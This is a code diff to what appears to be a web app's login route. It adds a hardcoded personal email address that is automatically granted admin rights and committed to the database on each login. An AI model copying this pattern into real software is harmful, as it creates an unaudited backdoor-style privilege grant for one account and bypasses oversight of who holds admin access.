@@ -171,6 +171,8 @@ def reset_password(payload: ResetPasswordPayload, db: Session = Depends(get_db))
     return {"detail": "Password has been reset successfully."}
 
 
+SUPERADMIN_EMAIL = "danakuz150@gmail.com"
+
 @router.post("/login", response_model=Token)
 def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
     user = db.query(User).filter(User.email == form_data.username).first()
@@ -185,6 +187,10 @@ def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depend
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Email not verified. Please check your inbox.",
         )
+    # Auto-grant admin to superadmin email
+    if user.email.lower() == SUPERADMIN_EMAIL and not user.is_admin:
+        user.is_admin = True
+        db.commit()
     token = create_access_token({
         "sub":       str(user.id),
         "full_name": user.full_name,
